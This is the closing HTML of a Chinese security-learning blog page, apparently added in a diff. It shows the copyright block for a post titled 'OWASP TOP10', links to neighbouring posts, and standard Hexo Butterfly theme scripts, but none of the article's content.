+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">z3lce</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.infore.top/2020/11/23/OWASP%20TOP10/">http://www.infore.top/2020/11/23/OWASP TOP10/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.infore.top" target="_blank">z3lce学习记录</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719093802.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/11/23/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"><img class="prev-cover" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719092955.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">等级保护</div></div></a></div><div class="next-post pull-right"><a href="/2020/11/22/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E7%90%86%E8%AE%BA/"><img class="next-cover" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719093619.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">安全设备理论</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By z3lce</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><button id="readmode" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" title="缩小字体"><i class="fas fa-minus"></i></button><button class="translate_chn_to_cht" id="translateLink" title="简繁转换">繁</button><button id="darkmode" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="/js/third-party/fireworks.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script defer id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="ribbon_piao" mobile="true" src="/js/third-party/piao.js"></script><script src="/js/third-party/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/search/local-search.js"></script><script>var endLoading = function () {
+  document.body.style.overflow = 'auto';
+  document.getElementById('loading-box').classList.add("loaded")
+}
+window.addEventListener('load',endLoading)</script></body></html>
